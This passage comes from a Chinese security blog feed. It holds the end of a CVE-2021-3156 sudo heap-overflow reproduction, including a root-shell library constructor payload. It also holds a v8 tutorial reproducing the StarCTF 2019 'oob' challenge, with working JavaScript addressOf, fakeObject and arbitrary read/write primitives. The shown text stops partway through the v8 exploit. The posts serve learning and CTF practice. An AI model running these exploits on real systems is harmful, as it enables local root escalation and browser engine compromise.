<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
 
<span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token keyword">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>constructor<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token function">_init</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
<span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">_init</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!!!] pwn!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setuid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
        <span class="token function">seteuid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
        <span class="token function">setgid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
        <span class="token function">setegid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">static</span> <span class="token keyword">char</span> <span class="token operator">*</span>a_argv<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token string">"sh"</span><span class="token punctuation">,</span> <span class="token constant">NULL</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
        <span class="token keyword">static</span> <span class="token keyword">char</span> <span class="token operator">*</span>a_envp<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token string">"PATH=/bin:/usr/bin:/sbin"</span><span class="token punctuation">,</span> <span class="token constant">NULL</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
        <span class="token function">execv</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span> a_argv<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<p>利用成功！</p>
<p><img src="/images/CVE-2021-3156/CVE-2021-3156-11.png" alt="pwn"></p>
<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>堆布局的方式比较复杂，其中这一句：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">memset</span><span class="token punctuation">(</span>LC1 <span class="token operator">+</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>LC_ENV1<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'X'</span><span class="token punctuation">,</span> <span class="token number">0xc0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>至于 0xc0 这个值是怎么来的？本人是 <strong>从 0 开始间隔 0x10 递增</strong>，观察堆的情况，一步步地测出来的</p>
<p>目前公开的文章也并没有做一个很好的解释，具体怎么回事，还是得跟踪调试 setlocale 的每一次 malloc 和 free 的调用了，写得比较好的 exp 是 <a href="https://github.com/blasty/CVE-2021-3156">blasty</a> 的 exp，其中提供了一个爆破脚本，就是为了测出这个合适的值</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这是我接触的第一个 CVE，漏洞原理相对还是比较简单的，从中也学到了 <strong>NSS</strong> 这个十分有意思的机制</p>
<p>最近在学 v8 的漏洞利用，下一次复现的就是 v8 的 CVE 了，加油！</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://blog.qualys.com/vulnerabilities-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit">https://blog.qualys.com/vulnerabilities-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit</a></li>
<li><a href="https://ama2in9.top/2021/02/04/cve-2021-3156/">https://ama2in9.top/2021/02/04/cve-2021-3156/</a></li>
<li><a href="https://mp.weixin.qq.com/s/zyeCBsLNRVdg2ckFnOXENg">https://mp.weixin.qq.com/s/zyeCBsLNRVdg2ckFnOXENg</a></li>
<li><a href="https://www.anquanke.com/post/id/231077">https://www.anquanke.com/post/id/231077</a></li>
<li><a href="https://www.jianshu.com/p/18f36f1342b3">https://www.jianshu.com/p/18f36f1342b3</a></li>
<li><a href="https://github.com/sudo-project/sudo/commit/1f8638577d0c80a4ff864a2aad80a0d95488e9a8">https://github.com/sudo-project/sudo/commit/1f8638577d0c80a4ff864a2aad80a0d95488e9a8</a></li>
<li><a href="https://github.com/blasty/CVE-2021-3156">https://github.com/blasty/CVE-2021-3156</a></li>
</ul>
]]></content>
      <categories>
        <category>CVE</category>
      </categories>
      <tags>
        <tag>sudo</tag>
      </tags>
  </entry>
  <entry>
    <title>v8 入门及 starctf-oob 复现</title>
    <url>/3b546c3b/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>pwn v8 入门学习，以及 starctf-oob 题目的复现过程</p>
<span id="more"></span>

<h2 id="v8-环境搭建"><a href="#v8-环境搭建" class="headerlink" title="v8 环境搭建"></a>v8 环境搭建</h2><p>安装依赖</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> binutils python2.7 perl socat <span class="token function">git</span> build-essential gdb gdbserver<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>安装 depot_tools</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">git</span> clone https://chromium.googlesource.com/chromium/tools/depot_tools.git
<span class="token builtin class-name">echo</span> <span class="token string">'export PATH=$PATH:"/path/to/depot_tools"'</span> <span class="token operator">>></span> ~/.bashrc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>



<p>编译 ninja</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">git</span> clone https://github.com/ninja-build/ninja.git 
<span class="token builtin class-name">cd</span> ninja <span class="token operator">&amp;&amp;</span> ./configure.py --bootstrap
<span class="token builtin class-name">echo</span> <span class="token string">'export PATH=$PATH:"/path/to/ninja"'</span> <span class="token operator">>></span> ~/.bashrc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h2 id="v8-编译步骤"><a href="#v8-编译步骤" class="headerlink" title="v8 编译步骤"></a>v8 编译步骤</h2><p>用 depot_tools 的工具拉取 v8 源码</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">fetch v8<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>随后，同步源码，然而 fetch 之后就是最新的了，这一步也不是必要的</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token builtin class-name">cd</span> v8 <span class="token operator">&amp;&amp;</span> gclient <span class="token function">sync</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>最后编译 v8</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">tools/dev/v8gen.py x64.debug <span class="token operator">&amp;&amp;</span> ninja -C out.gn/x64.debug <span class="token comment"># debug 版本</span>
tools/dev/v8gen.py x64.release <span class="token operator">&amp;&amp;</span> ninja -C out.gn/x64.release <span class="token comment"># release 版本</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>编译完后，可用在 <code>out.gn/x64.debug</code> 里的 d8 来执行，调试 js 代码</p>
<h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p>v8 提供了 gdb 的调试插件<br><img src="/images/3b546c3b/pasted-0.png" alt="gdb-v8-support"></p>
<p>添加到 gdbinit 脚本中</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token builtin class-name">source</span> /path_to_v8/tools/gdbinit
<span class="token builtin class-name">source</span> /path_to_v8/tools/gdb-v8-support.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>写一个测试脚本，学习一下基本的调试</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> b <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'a'</span><span class="token operator">:</span> <span class="token string">'asd'</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> c <span class="token operator">=</span> <span class="token punctuation">[</span>a<span class="token punctuation">,</span> b<span class="token punctuation">]</span><span class="token punctuation">;</span>


<span class="token operator">%</span><span class="token function">DebugPrint</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">%</span><span class="token function">SystemBreak</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token operator">%</span><span class="token function">DebugPrint</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">%</span><span class="token function">SystemBreak</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token operator">%</span><span class="token function">DebugPrint</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">%</span><span class="token function">SystemBreak</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<p>运行 d8 加上 <code>--allow-natives-syntax</code> 参数，以支持 <code>%DebugPrint</code> 和 <code>%SystemBreak</code> 等</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">./d8 --allow-natives-syntax ./test.js
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>运行结果如下：<br><img src="/images/3b546c3b/pasted-2.png" alt="d8test"></p>
<p><code>%DebugPrint</code> 的功能是输出显示变量，对于对象，会将对象的地址显示出来，而 <code>%SystemBreak</code> 的作用是触发一个调试中断</p>
<p>现在用 gdb 来调试，<code>gdb ./d8</code></p>
<p>然后设置一下命令行参数 <code>set args --allow-natives-syntax ./test.js</code></p>
<p><code>run</code> 命令开始调试，可以看到，由于 <code>%SystemBreak</code>，程序暂停运行，并看到 <code>%DebugPrint(a)</code> 输出<br><img src="/images/3b546c3b/pasted-3.png" alt="dbgtest1"></p>
<p><code>c</code> 命令继续运行，可以看到对象的地址输出来了<br><img src="/images/3b546c3b/pasted-5.png" alt="dbgtest2"></p>
<p>这里附加说明一下，<strong>v8 里的对象地址，最低 bit 都是 1，减去 1 才是真实存储对象数据的起始地址</strong></p>
<p>由于 v8 提供的 gdb 插件，我们可以使用 <code>job</code> 命令来查看对象更详细的信息<br><img src="/images/3b546c3b/pasted-6.png" alt="dbgtest3"></p>
<p>先继续运行，来到第三处断点<br><img src="/images/3b546c3b/pasted-7.png" alt="dbgtest4"><br><img src="/images/3b546c3b/pasted-8.png" alt="dbgtest5"></p>
<p>这里简单讲讲 v8 对象的存储结构，主要有 map，prototype，elements，length，properties<br><img src="/images/3b546c3b/pasted-9.png" alt="dbgtest6"></p>
<p>map 用来表明对象的类型，elements 是一个对象指针，存储了数组的元素，length 就是数组的大小，properties 也是一个对象指针，存储了对象的属性</p>
<p>这里再使用 telescope 命令（pwndbg 插件）查看对象的内存布局<br><img src="/images/3b546c3b/pasted-10.png" alt="dbgtest7"></p>
<p>另一方面也看到了，length 整数值存储在高 32 位上</p>
<p>前面说了，elements 也是一个对象，同样可以使用 job 命令查看<br><img src="/images/3b546c3b/pasted-11.png" alt="dbgtest8"></p>
<h2 id="StarCTF-2019-oob-复现"><a href="#StarCTF-2019-oob-复现" class="headerlink" title="StarCTF 2019 oob 复现"></a>StarCTF 2019 oob 复现</h2><p>题目可以从这里下载：<a href="https://github.com/DayJun/Blogs/tree/master/Articles/starCTF-OOB">https://github.com/DayJun/Blogs/tree/master/Articles/starCTF-OOB</a></p>
<p>题目提供了一个 oob.diff 文件，并且 commit 是 <code>6dc88c191f5ecc5389dc26efa3ca0907faef3598</code></p>
<p>这里先根据 diff 文件 patch 源码</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">git</span> reset --hard  6dc88c191f5ecc5389dc26efa3ca0907faef3598
<span class="token function">git</span> checkout
<span class="token function">git</span> apply <span class="token operator">&lt;</span> /path_to_diff/oob.diff<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>这里要注意的是，这个题目，使用 debug 版编译，调试的时候有些问题，需要改用 release 模式编译</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">tools/dev/v8gen.py x64.release<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>但是为了使用 job 等调试命令，需要在 <code>out.gn/x64.release/args.gn</code> 文件加入以下内容：</p>
<pre class="line-numbers language-none"><code class="language-none">v8_enable_backtrace &#x3D; true
v8_enable_disassembler &#x3D; true
v8_enable_object_print &#x3D; true
v8_enable_verify_heap &#x3D; true<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>然后编译即可</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">ninja -C out.gn/x64.release<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="oob-diff"><a href="#oob-diff" class="headerlink" title="oob.diff"></a>oob.diff</h3><p>接下来要分析题目给的 oob.diff 对 v8 源码做了什么修改，文件关键内容如下：</p>
<pre class="line-numbers language-none"><code class="language-none">...
+    SimpleInstallFunction(isolate_, proto, &quot;oob&quot;,
+                          Builtins::kArrayOob,2,false);
...
+BUILTIN(ArrayOob)&#123;
+    uint32_t len &#x3D; args.length();
+    if(len &gt; 2) return ReadOnlyRoots(isolate).undefined_value();
+    Handle&lt;JSReceiver&gt; receiver;
+    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
+            isolate, receiver, Object::ToObject(isolate, args.receiver()));
+    Handle&lt;JSArray&gt; array &#x3D; Handle&lt;JSArray&gt;::cast(receiver);
+    FixedDoubleArray elements &#x3D; FixedDoubleArray::cast(array-&gt;elements());
+    uint32_t length &#x3D; static_cast&lt;uint32_t&gt;(array-&gt;length()-&gt;Number());
+    if(len &#x3D;&#x3D; 1)&#123;
+        &#x2F;&#x2F;read
+        return *(isolate-&gt;factory()-&gt;NewNumber(elements.get_scalar(length)));
+    &#125;else&#123;
+        &#x2F;&#x2F;write
+        Handle&lt;Object&gt; value;
+        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
+                isolate, value, Object::ToNumber(isolate, args.at&lt;Object&gt;(1)));
+        elements.set(length,value-&gt;Number());
+        return ReadOnlyRoots(isolate).undefined_value();
+    &#125;
+&#125;
...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>可以看到，diff 文件给 Array 数组对象增加了一个 oob 方法，参数个数为 1 和 2 的情况做了不同的处理，参数个数为 1 时，即调用方法无参数的时候（因为对象 this 指针是第一个参数），将 <code>elements[length]</code> 的值返回 ，参数个数为 2 时，即调用方法有一个参数时，将调用方法传递的参数值写入  <code>elements[length]</code></p>
<p>所以 oob 存在一个<strong>越界读写</strong>数组的漏洞</p>
<h3 id="类型混淆"><a href="#类型混淆" class="headerlink" title="类型混淆"></a>类型混淆</h3><p>再次回到前面的一张图片<br><img src="/images/3b546c3b/pasted-10.png" alt="layout"></p>
<p>对象 <code>c</code> 的 elements 指针指向的地址为 <code>0x36563a38de11</code>，而对象 <code>c</code> 的地址为 <code>0x36563a38de31</code>，且对象开头就是 map，所以 map 在 elements 指针指向区域的后面，如果越界读写 elements，就有可能修改 map，造成类型混淆</p>
<p>参考下面代码，进行一个调试，查看不同类型的数组对象的内存布局</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> arr1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> arr2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1.1</span><span class="token punctuation">,</span> <span class="token number">1.2</span><span class="token punctuation">,</span> <span class="token number">1.3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> arr3 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Array</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token operator">%</span><span class="token function">DebugPrint</span><span class="token punctuation">(</span>arr1<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">%</span><span class="token function">SystemBreak</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token operator">%</span><span class="token function">DebugPrint</span><span class="token punctuation">(</span>arr2<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">%</span><span class="token function">SystemBreak</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token operator">%</span><span class="token function">DebugPrint</span><span class="token punctuation">(</span>arr3<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">%</span><span class="token function">SystemBreak</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>来到第一处断点，可以看到整数数组对象的 map 变量就在 elements 指向的区域后面，但是 oob 方法只能越界一个元素的位置，这里明显不够<br><img src="/images/3b546c3b/pasted-12.png" alt="starctf1"></p>
<p>继续运行，来到第二处断点，查看 arr2 即浮点数类型数组对象的内存布局，elements 区域紧接着就是 map，刚好可以修改数组对象的 map 造成类型混淆<br><img src="/images/3b546c3b/pasted-13.png" alt="starctf2"></p>
<p>我们可以用浮点数类型的数组对象来利用漏洞造成类型混淆，这里先不急，继续运行来到最后一处断点<br><img src="/images/3b546c3b/pasted-14.png" alt="starctf3"></p>
<p>可以看到，使用 <code>new</code> 的方式创建的数组，elements 位于 map 的后面，无法用于利用漏洞，其它情况的数组对象的内存布局可以多做尝试，这里就不再深究了</p>
<p>如果将一个 Float 类型的数组的 map 修改为对象数组类型，那么数组里的浮点数数值就被当成对象地址去解析，反之也可以将任意对象地址解析成浮点数，通过一定转换就可以获取对象的地址了</p>
<p>这里分别写出完成上面两个功能的函数：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"a"</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> obj_array <span class="token operator">=</span> <span class="token punctuation">[</span>obj<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> float_array <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1.1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token comment">// leak map</span>
<span class="token keyword">var</span> obj_array_map <span class="token operator">=</span> obj_array<span class="token punctuation">.</span><span class="token function">oob</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> float_array_map <span class="token operator">=</span> float_array<span class="token punctuation">.</span><span class="token function">oob</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


<span class="token comment">//leak address of obj</span>
<span class="token comment">//obj_to_leak: Object</span>
<span class="token comment">//return: integer</span>
<span class="token keyword">function</span> <span class="token function">addressOf</span><span class="token punctuation">(</span><span class="token parameter">obj_to_leak</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	obj_array<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> obj_to_leak<span class="token punctuation">;</span>
	obj_array<span class="token punctuation">.</span><span class="token function">oob</span><span class="token punctuation">(</span>float_array_map<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//类型混淆</span>
	
	<span class="token keyword">let</span> obj_addr <span class="token operator">=</span> obj_array<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	obj_array<span class="token punctuation">.</span><span class="token function">oob</span><span class="token punctuation">(</span>obj_array_map<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//恢复类型</span>

	<span class="token keyword">return</span> <span class="token function">f2i</span><span class="token punctuation">(</span>obj_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">//create fake object</span>
<span class="token comment">//addr_to_fake: interger</span>
<span class="token keyword">function</span> <span class="token function">fakeObject</span><span class="token punctuation">(</span><span class="token parameter">addr_to_fake</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>

	float_array<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">i2f</span><span class="token punctuation">(</span>addr_to_fake<span class="token punctuation">)</span><span class="token punctuation">;</span>
	float_array<span class="token punctuation">.</span><span class="token function">oob</span><span class="token punctuation">(</span>obj_array_map<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">let</span> faked_obj <span class="token operator">=</span> float_array<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

	float_array<span class="token punctuation">.</span><span class="token function">oob</span><span class="token punctuation">(</span>float_array_map<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">return</span> faked_obj<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>其中 <code>addressOf</code> 函数可以获取任意对象的地址，<code>fakeObject</code> 可以将任意地址伪造成一个 Float 类型的数组对象</p>
<p>由于 <code>addressOf</code> 是将对象的地址解析成浮点数，不太方便后续运算，这里使用一个自定义的 <code>f2i</code> 函数将其解析成整数，同理 <code>i2f</code> 函数将整数的内存表示解析成浮点数，代码如下：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> buf <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayBuffer</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> float64 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Float64Array</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> bigUint64 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BigUint64Array</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">//float to integer</span>
<span class="token keyword">function</span> <span class="token function">f2i</span><span class="token punctuation">(</span><span class="token parameter">f</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	float64<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> f<span class="token punctuation">;</span>

	<span class="token keyword">return</span> bigUint64<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">//integer to float</span>
<span class="token keyword">function</span> <span class="token function">i2f</span><span class="token punctuation">(</span><span class="token parameter">i</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	bigUint64<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>

	<span class="token keyword">return</span> float64<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这里可以测试一下代码：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> test_obj <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"aa"</span><span class="token operator">:</span> <span class="token string">"aaa"</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> addr <span class="token operator">=</span> <span class="token function">addressOf</span><span class="token punctuation">(</span>test_obj<span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'addr = '</span> <span class="token operator">+</span> addr<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token operator">%</span><span class="token function">DebugPrint</span><span class="token punctuation">(</span>test_obj<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">%</span><span class="token function">SystemBreak</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>调试运行，可以看到 <code>addressOf</code> 函数成功的得到了 <code>test_obj</code> 对象的地址<br><img src="/images/3b546c3b/pasted-15.png" alt="starctf4"></p>
<h3 id="任意地址读写"><a href="#任意地址读写" class="headerlink" title="任意地址读写"></a>任意地址读写</h3><p>结合 <code>addresssOf</code> 和 <code>fakeObject</code>，可以伪造一个数组对象，控制 elements 指针即可造成任意地址读写，这里画一个伪造的对象的图<br><img src="/images/3b546c3b/pasted-16.png" alt="fakeObject"></p>
<p>这个伪造的对象的数据可以存在一个 Float 数组里，通过 <code>addressOf</code> 函数，得到数据的存储地址，利用 <code>fakeObject</code> 将该地址转换成数组对象指针，通过这个伪造的数组对象即可造成任意读写，代码如下：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">//create fake array obj</span>
<span class="token keyword">var</span> fake_array <span class="token operator">=</span> <span class="token punctuation">[</span>
    float_array_map<span class="token punctuation">,</span> <span class="token comment">//map</span>
    <span class="token function">i2f</span><span class="token punctuation">(</span><span class="token number">0n</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  
    <span class="token function">i2f</span><span class="token punctuation">(</span><span class="token number">0x41414141n</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment">//elements</span>
    <span class="token function">i2f</span><span class="token punctuation">(</span><span class="token number">0x1000000000n</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token comment">//length</span>
    <span class="token number">1.1</span><span class="token punctuation">,</span>
    <span class="token number">2.2</span><span class="token punctuation">,</span>
<span class="token punctuation">]</span><span class="token punctuation">;</span>


<span class="token keyword">var</span> fake_obj_addr <span class="token operator">=</span> <span class="token function">addressOf</span><span class="token punctuation">(</span>fake_array<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x40n</span> <span class="token operator">+</span> <span class="token number">0x10n</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'fake_obj_addr = '</span> <span class="token operator">+</span> fake_obj_addr<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">var</span> fake_obj <span class="token operator">=</span> <span class="token function">fakeObject</span><span class="token punctuation">(</span>fake_obj_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token operator">%</span><span class="token function">DebugPrint</span><span class="token punctuation">(</span>fake_array<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">%</span><span class="token function">SystemBreak</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

